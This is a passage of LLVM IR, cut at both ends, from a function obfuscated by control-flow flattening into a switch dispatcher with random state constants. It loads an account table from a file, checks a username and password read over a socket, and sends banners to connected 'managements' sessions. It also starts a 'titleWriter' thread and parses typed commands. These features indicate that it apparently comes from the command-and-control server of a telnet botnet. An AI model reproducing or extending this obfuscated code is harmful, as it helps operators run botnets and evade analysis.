    i32 -1770909859, label %552
    i32 228577667, label %553
    i32 -101794791, label %554
    i32 1206132379, label %559
    i32 -1454173707, label %564
    i32 -1552000320, label %569
    i32 1663052553, label %574
    i32 -2060124482, label %596
    i32 -1528085202, label %597
    i32 920846390, label %605
    i32 -811197583, label %606
    i32 432675768, label %614
    i32 593789210, label %615
    i32 -408380973, label %623
    i32 -38174676, label %624
    i32 -853795986, label %632
    i32 -611734240, label %633
    i32 239718280, label %641
    i32 1182293349, label %642
    i32 36409457, label %650
    i32 1200503902, label %651
    i32 -442309029, label %654
    i32 -1125598083, label %670
    i32 1657451319, label %671
    i32 -749049959, label %672
    i32 -848776134, label %673
    i32 -519678905, label %678
    i32 426437235, label %683
    i32 -1009069689, label %688
    i32 231757984, label %693
    i32 1278683446, label %719
    i32 -600112771, label %720
    i32 -1038128071, label %728
    i32 -1043269274, label %729
    i32 -343099869, label %737
    i32 1689499786, label %738
    i32 1184421389, label %746
    i32 -850762293, label %747
    i32 -701678034, label %755
    i32 25785941, label %756
    i32 -524036999, label %764
    i32 1809647693, label %765
    i32 -501173829, label %773
    i32 274130103, label %774
    i32 564977054, label %782
    i32 -1524340207, label %783
    i32 -907685291, label %786
    i32 1222605011, label %802
    i32 -245485650, label %803
    i32 -2079122645, label %804
    i32 -96376927, label %805
    i32 -439764605, label %810
    i32 1371877037, label %815
    i32 -473455638, label %820
    i32 1035334070, label %825
    i32 -64678657, label %857
    i32 -1879494294, label %858
    i32 -893702319, label %866
    i32 -1800208507, label %867
    i32 500185120, label %875
    i32 1357934547, label %876
    i32 -1346518630, label %884
    i32 -1084920819, label %885
    i32 1225560467, label %893
    i32 417215622, label %894
    i32 -2047048484, label %902
    i32 -374133876, label %903
    i32 168172335, label %911
    i32 490997342, label %912
    i32 368034310, label %920
    i32 -74898170, label %921
    i32 -1131827051, label %929
    i32 1653702422, label %930
    i32 2105261316, label %938
    i32 -27977057, label %939
    i32 344562666, label %947
    i32 201327570, label %948
    i32 1744020619, label %956
    i32 122240678, label %957
    i32 -1315182204, label %960
    i32 1959880338, label %976
    i32 -173989951, label %977
    i32 -1505378814, label %978
    i32 -1047871999, label %979
    i32 -1064318943, label %984
    i32 -417270617, label %989
    i32 -1949208803, label %994
    i32 -1448467956, label %999
    i32 -540775182, label %1004
    i32 -609964908, label %1024
    i32 1652929251, label %1025
    i32 2137380111, label %1033
    i32 1475734415, label %1034
    i32 16319750, label %1042
    i32 2145560890, label %1043
    i32 -600126780, label %1051
    i32 464556150, label %1052
    i32 1322531194, label %1060
    i32 393627757, label %1061
    i32 1420325796, label %1064
    i32 782811879, label %1080
    i32 -595604909, label %1081
    i32 887431271, label %1082
    i32 404138287, label %1083
    i32 -374422586, label %1088
    i32 -1393390192, label %1093
    i32 1589300125, label %1098
    i32 1236850146, label %1154
    i32 2011894538, label %1155
    i32 -712053033, label %1163
    i32 -330507517, label %1164
    i32 -1259939936, label %1172
    i32 1731710144, label %1173
    i32 635437299, label %1181
    i32 1307065746, label %1182
    i32 -744001301, label %1190
    i32 36900630, label %1191
    i32 1918692499, label %1199
    i32 1696339931, label %1200
    i32 316279665, label %1208
    i32 -1210283602, label %1209
    i32 780876105, label %1217
    i32 1680619402, label %1218
    i32 -1138194821, label %1226
    i32 2050326589, label %1227
    i32 2013700287, label %1235
    i32 1459985899, label %1236
    i32 -245225138, label %1244
    i32 -828071792, label %1245
    i32 1978461945, label %1253
    i32 1011016955, label %1254
    i32 273691829, label %1262
    i32 328917562, label %1263
    i32 -1365104454, label %1271
    i32 439475999, label %1272
    i32 1854500319, label %1280
    i32 -75394967, label %1281
    i32 -810940481, label %1289
    i32 -1534451430, label %1290
    i32 586642484, label %1298
    i32 -755911887, label %1299
    i32 -216957403, label %1307
    i32 1441109186, label %1308
    i32 -1490751895, label %1316
    i32 606162654, label %1317
    i32 554054150, label %1325
    i32 -128506949, label %1326
    i32 1736802433, label %1334
    i32 1368964142, label %1335
    i32 487635488, label %1343
    i32 1711858934, label %1344
    i32 -1335029558, label %1352
    i32 -744289458, label %1353
    i32 298290902, label %1356
    i32 -1293203683, label %1372
    i32 -17872267, label %1373
    i32 -391126925, label %1374
    i32 856870603, label %1375
    i32 -725065046, label %1380
    i32 1998072201, label %1385
    i32 1492876316, label %1390
    i32 458685786, label %1395
    i32 -1352288436, label %1400
    i32 245350618, label %1426
    i32 -1698302246, label %1427
    i32 965826971, label %1435
    i32 -1037061500, label %1436
    i32 1131817901, label %1444
    i32 835859996, label %1445
    i32 -1213561868, label %1453
    i32 -742168236, label %1454
    i32 -1018441933, label %1462
    i32 735152139, label %1463
    i32 -1825503055, label %1471
    i32 -1703160094, label %1472
    i32 -1802326297, label %1480
    i32 1665422042, label %1481
    i32 567716480, label %1489
    i32 1918511505, label %1490
    i32 -19291786, label %1493
    i32 -1751194803, label %1509
    i32 1566752106, label %1510
    i32 -798784803, label %1511
    i32 696369707, label %1512
    i32 1962936628, label %1517
    i32 -203689271, label %1536
    i32 1208443472, label %1541
    i32 -1454743660, label %1560
    i32 -959796743, label %1565
    i32 -919983572, label %1570
    i32 1757807460, label %1589
    i32 1355952716, label %1594
    i32 1956754802, label %1599
    i32 209007499, label %1609
    i32 283170383, label %1610
    i32 -880870660, label %1611
    i32 660118659, label %1616
    i32 1557305027, label %1626
    i32 1296852489, label %1627
    i32 -1326921117, label %1628
    i32 -1299337875, label %1633
    i32 -853353690, label %1643
    i32 1904445667, label %1644
    i32 696572850, label %1645
    i32 706889866, label %1650
    i32 -1216891555, label %1655
    i32 -212645745, label %1665
    i32 -1429368156, label %1685
    i32 785591821, label %1686
    i32 1093322975, label %1687
    i32 1707530648, label %1697
    i32 -1828084290, label %1698
    i32 1877994796, label %1699
    i32 -1624940563, label %1700
    i32 -794128762, label %1705
    i32 -1164025036, label %1710
    i32 -593524815, label %1720
    i32 1212136781, label %1755
    i32 711631215, label %1756
    i32 -1827661575, label %1757
    i32 760459851, label %1767
    i32 -1665851204, label %1768
    i32 761702364, label %1769
    i32 -2109651127, label %1770
    i32 1598547706, label %1775
    i32 -1189491500, label %1785
    i32 1552313509, label %1786
    i32 -763863097, label %1787
    i32 -1831644443, label %1792
    i32 -1547293182, label %1802
    i32 1555259563, label %1803
    i32 -1161596352, label %1804
    i32 -1884219602, label %1809
    i32 -120975721, label %1819
    i32 -1426852412, label %1820
    i32 1468737716, label %1821
    i32 -775908931, label %1826
    i32 1087205385, label %1836
    i32 1196377775, label %1837
    i32 -402073845, label %1838
    i32 -279792557, label %1843
    i32 -771470575, label %1853
    i32 1386037940, label %1854
    i32 27229730, label %1855
    i32 2134643901, label %1860
    i32 -209017962, label %1870
    i32 2113877569, label %1871
    i32 -274915070, label %1872
    i32 -327574455, label %1877
    i32 549650922, label %1887
    i32 -2058494442, label %1888
    i32 -292433707, label %1889
    i32 1180548535, label %1894
    i32 482204922, label %1904
    i32 -2033077397, label %1905
    i32 -2042464551, label %1906
    i32 -1521188557, label %1911
    i32 -820879126, label %1921
    i32 -1803684081, label %1922
    i32 -1872816776, label %1923
    i32 1616894131, label %1928
    i32 1346588809, label %1938
    i32 1140944866, label %1939
    i32 -436811268, label %1940
    i32 -1324399758, label %1945
    i32 -1482456118, label %1955
    i32 -374189052, label %1956
    i32 2109228101, label %1957
    i32 589273203, label %1962
    i32 651762541, label %1972
    i32 -1460293767, label %1973
    i32 -1774792352, label %1974
    i32 -771588884, label %1979
    i32 1038721011, label %1989
    i32 -1790609690, label %1990
    i32 -1406754586, label %1991
    i32 1975777437, label %1996
    i32 1198657189, label %2006
    i32 1763552050, label %2007
    i32 2032009135, label %2008
    i32 794055582, label %2013
    i32 -856400417, label %2023
    i32 -455588549, label %2024
    i32 84715651, label %2025
    i32 -538849762, label %2030
    i32 -988737624, label %2035
    i32 -1764579099, label %2061
    i32 -559041329, label %2062
    i32 -162876220, label %2063
    i32 906792809, label %2068
    i32 2006116496, label %2078
    i32 -438175725, label %2079
    i32 -1160111733, label %2080
    i32 -942996028, label %2085
    i32 -1746380519, label %2095
    i32 1396731683, label %2096
    i32 -289702940, label %2097
    i32 -2059697907, label %2102
    i32 2075260857, label %2112
    i32 -542235292, label %2113
    i32 401660737, label %2114
    i32 -1450101561, label %2119
    i32 984183680, label %2129
    i32 -1211169825, label %2130
    i32 -874786877, label %2131
    i32 -216762143, label %2136
    i32 -950124485, label %2146
    i32 -222818967, label %2147
    i32 -759880557, label %2148
    i32 -183128906, label %2153
    i32 256016814, label %2163
    i32 857097256, label %2164
    i32 1705657385, label %2165
    i32 -1384375202, label %2170
    i32 -1226511829, label %2180
    i32 524677046, label %2181
    i32 -1976558769, label %2182
    i32 -1536718226, label %2187
    i32 -421518672, label %2197
    i32 -746056423, label %2198
    i32 -1855879044, label %2199
    i32 -2043980716, label %2204
    i32 1388687615, label %2214
    i32 1103300997, label %2215
    i32 1881465558, label %2216
    i32 -477752699, label %2221
    i32 -1225977809, label %2231
    i32 -379791128, label %2232
    i32 399173771, label %2233
    i32 704068582, label %2238
    i32 -504349321, label %2239
    i32 -1728467054, label %2244
    i32 -445661744, label %2245
    i32 1324042682, label %2250
    i32 -1320764758, label %2251
    i32 -1746026920, label %2256
    i32 1634279010, label %2257
    i32 -1635427377, label %2262
    i32 -602228865, label %2263
    i32 1099334476, label %2268
    i32 -1972265050, label %2269
    i32 397630595, label %2286
    i32 -1521499086, label %2287
    i32 1036124288, label %2292
    i32 -845320296, label %2293
    i32 1143334506, label %2316
    i32 -1268742680, label %2317
    i32 477988641, label %2326
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %122 = call i32 @feof(%struct._IO_FILE* %121) #7
  %123 = icmp ne i32 %122, 0
  %124 = xor i1 %123, true
  %125 = select i1 %124, i32 439907680, i32 -1601727312
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %128 = call i32 @fgetc(%struct._IO_FILE* %127)
  store i32 %128, i32* %16, align 4
  %129 = load i32, i32* %15, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %15, align 4
  store i32 1750345377, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 0, i32* %17, align 4
  %132 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %132)
  store i32 517141801, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %17, align 4
  %135 = load i32, i32* %15, align 4
  %136 = sub nsw i32 %135, 1
  %137 = icmp ne i32 %134, %136
  %138 = select i1 %137, i32 223926465, i32 555777999
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %141 = load i32, i32* %17, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %142
  %144 = getelementptr inbounds %struct.account, %struct.account* %143, i32 0, i32 0
  %145 = getelementptr inbounds [20 x i8], [20 x i8]* %144, i32 0, i32 0
  %146 = load i32, i32* %17, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %147
  %149 = getelementptr inbounds %struct.account, %struct.account* %148, i32 0, i32 1
  %150 = getelementptr inbounds [20 x i8], [20 x i8]* %149, i32 0, i32 0
  %151 = load i32, i32* %17, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %152
  %154 = getelementptr inbounds %struct.account, %struct.account* %153, i32 0, i32 2
  %155 = getelementptr inbounds [20 x i8], [20 x i8]* %154, i32 0, i32 0
  %156 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %140, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.16, i32 0, i32 0), i8* %145, i8* %150, i8* %155)
  %157 = load i32, i32* %17, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %17, align 4
  store i32 517141801, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %161 = call i32 (i8*, i8*, ...) @sprintf(i8* %160, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0)) #7
  %162 = load i32, i32* %4, align 4
  %163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %164 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %165 = call i64 @strlen(i8* %164) #8
  %166 = call i64 @send(i32 %162, i8* %163, i64 %165, i32 16384)
  %167 = icmp eq i64 %166, -1
  %168 = select i1 %167, i32 -288719121, i32 1299783269
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %172 = call i32 (i8*, i8*, ...) @sprintf(i8* %171, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.18, i32 0, i32 0)) #7
  %173 = load i32, i32* %4, align 4
  %174 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %176 = call i64 @strlen(i8* %175) #8
  %177 = call i64 @send(i32 %173, i8* %174, i64 %176, i32 16384)
  %178 = icmp eq i64 %177, -1
  %179 = select i1 %178, i32 -368665475, i32 -1470276117
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %183 = load i32, i32* %4, align 4
  %184 = call i32 @fdgets(i8* %182, i32 2048, i32 %183)
  %185 = icmp slt i32 %184, 1
  %186 = select i1 %185, i32 -1221340798, i32 -2046868321
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %189)
  %190 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %191 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %192 = call i32 (i8*, i8*, ...) @sprintf(i8* %190, i8* %191) #7
  %193 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %193, i8** %9, align 8
  %194 = load i8*, i8** %9, align 8
  %195 = call i32 @Search_in_File(i8* %194)
  store i32 %195, i32* %5, align 4
  %196 = load i8*, i8** %9, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %198
  %200 = getelementptr inbounds %struct.account, %struct.account* %199, i32 0, i32 0
  %201 = getelementptr inbounds [20 x i8], [20 x i8]* %200, i32 0, i32 0
  %202 = call i32 @strcmp(i8* %196, i8* %201) #8
  %203 = icmp eq i32 %202, 0
  %204 = select i1 %203, i32 121720028, i32 180318446
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %207 = call i32 (i8*, i8*, ...) @sprintf(i8* %206, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i32 0, i32 0)) #7
  %208 = load i32, i32* %4, align 4
  %209 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %210 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %211 = call i64 @strlen(i8* %210) #8
  %212 = call i64 @send(i32 %208, i8* %209, i64 %211, i32 16384)
  %213 = icmp eq i64 %212, -1
  %214 = select i1 %213, i32 -1919112581, i32 -1271456828
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %218 = load i32, i32* %4, align 4
  %219 = call i32 @fdgets(i8* %217, i32 2048, i32 %218)
  %220 = icmp slt i32 %219, 1
  %221 = select i1 %220, i32 533930306, i32 -421616647
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %224)
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %226 = load i32, i32* %5, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %227
  %229 = getelementptr inbounds %struct.account, %struct.account* %228, i32 0, i32 1
  %230 = getelementptr inbounds [20 x i8], [20 x i8]* %229, i32 0, i32 0
  %231 = call i32 @strcmp(i8* %225, i8* %230) #8
  %232 = icmp ne i32 %231, 0
  %233 = select i1 %232, i32 -1143500144, i32 -1682023383
  store i32 %233, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  store i32 -2077916187, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %236, i8 0, i64 2048, i32 16, i1 false)
  store i32 -310015403, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 -2077916187, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8*, i8** %3, align 8
  %240 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %239) #7
  %241 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %241, i8 0, i64 2048, i32 16, i1 false)
  %242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %243 = call i32 (i8*, i8*, ...) @sprintf(i8* %242, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.21, i32 0, i32 0)) #7
  %244 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %245 = call i32 (i8*, i8*, ...) @sprintf(i8* %244, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.22, i32 0, i32 0)) #7
  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %247 = call i32 (i8*, i8*, ...) @sprintf(i8* %246, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.23, i32 0, i32 0)) #7
  %248 = call i32 @sleep(i32 1)
  %249 = load i32, i32* %4, align 4
  %250 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %251 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %252 = call i64 @strlen(i8* %251) #8
  %253 = call i64 @send(i32 %249, i8* %250, i64 %252, i32 16384)
  %254 = icmp eq i64 %253, -1
  %255 = select i1 %254, i32 1982346680, i32 1844926162
  store i32 %255, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %4, align 4
  %259 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %260 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %261 = call i64 @strlen(i8* %260) #8
  %262 = call i64 @send(i32 %258, i8* %259, i64 %261, i32 16384)
  %263 = icmp eq i64 %262, -1
  %264 = select i1 %263, i32 -19523524, i32 -64405427
  store i32 %264, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i32, i32* %4, align 4
  %268 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %269 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %270 = call i64 @strlen(i8* %269) #8
  %271 = call i64 @send(i32 %267, i8* %268, i64 %270, i32 16384)
  %272 = icmp eq i64 %271, -1
  %273 = select i1 %272, i32 66870078, i32 617169406
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = call i32 @sleep(i32 7)
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %3, align 8
  %279 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %278) #7
  %280 = load i32, i32* %4, align 4
  %281 = call i64 @send(i32 %280, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %282 = icmp eq i64 %281, -1
  %283 = select i1 %282, i32 -190055821, i32 -1764870627
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  %286 = load i32, i32* %4, align 4
  %287 = call i64 @send(i32 %286, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i64 2, i32 16384)
  %288 = icmp eq i64 %287, -1
  %289 = select i1 %288, i32 1348405995, i32 847574546
  store i32 %289, i32* %switchVar
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %293 = call i32 (i8*, i8*, ...) @sprintf(i8* %292, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.26, i32 0, i32 0)) #7
  %294 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %295 = call i32 (i8*, i8*, ...) @sprintf(i8* %294, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.27, i32 0, i32 0)) #7
  %296 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %297 = call i32 (i8*, i8*, ...) @sprintf(i8* %296, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.28, i32 0, i32 0)) #7
  %298 = load i32, i32* %4, align 4
  %299 = call i64 @send(i32 %298, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %300 = icmp eq i64 %299, -1
  %301 = select i1 %300, i32 95838048, i32 -368814786
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i32, i32* %4, align 4
  %305 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %306 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %307 = call i64 @strlen(i8* %306) #8
  %308 = call i64 @send(i32 %304, i8* %305, i64 %307, i32 16384)
  %309 = icmp eq i64 %308, -1
  %310 = select i1 %309, i32 -2103068164, i32 71274203
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i32, i32* %4, align 4
  %314 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %315 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %316 = call i64 @strlen(i8* %315) #8
  %317 = call i64 @send(i32 %313, i8* %314, i64 %316, i32 16384)
  %318 = icmp eq i64 %317, -1
  %319 = select i1 %318, i32 227429708, i32 77354030
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  %322 = load i32, i32* %4, align 4
  %323 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %324 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %325 = call i64 @strlen(i8* %324) #8
  %326 = call i64 @send(i32 %322, i8* %323, i64 %325, i32 16384)
  %327 = icmp eq i64 %326, -1
  %328 = select i1 %327, i32 -1659387318, i32 -574066717
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  store i32 -30612690, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  %332 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %333 = load i32, i32* %5, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %334
  %336 = getelementptr inbounds %struct.account, %struct.account* %335, i32 0, i32 0
  %337 = getelementptr inbounds [20 x i8], [20 x i8]* %336, i32 0, i32 0
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %339 = call i32 (i8*, i8*, ...) @sprintf(i8* %332, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %337, i8* %338) #7
  %340 = load i32, i32* %4, align 4
  %341 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %342 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %343 = call i64 @strlen(i8* %342) #8
  %344 = call i64 @send(i32 %340, i8* %341, i64 %343, i32 16384)
  %345 = icmp eq i64 %344, -1
  %346 = select i1 %345, i32 1323293782, i32 -767225582
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  store i32 1988860721, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i8*, i8** %3, align 8
  %351 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %350) #7
  %352 = load i32, i32* %4, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %353
  %355 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %354, i32 0, i32 1
  store i32 1, i32* %355, align 4
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %358 = load i32, i32* %4, align 4
  %359 = call i32 @fdgets(i8* %357, i32 2048, i32 %358)
  %360 = icmp sgt i32 %359, 0
  %361 = select i1 %360, i32 -597458717, i32 1143334506
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %364 = call i8* @strstr(i8* %363, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #8
  %365 = icmp ne i8* %364, null
  %366 = select i1 %365, i32 1919318703, i32 -1714669571
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %369 = call i8* @strstr(i8* %368, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0)) #8
  %370 = icmp ne i8* %369, null
  %371 = select i1 %370, i32 1919318703, i32 847241961
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %374 = call i8* @strstr(i8* %373, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #8
  %375 = icmp ne i8* %374, null
  %376 = select i1 %375, i32 1919318703, i32 130255518
  store i32 %376, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
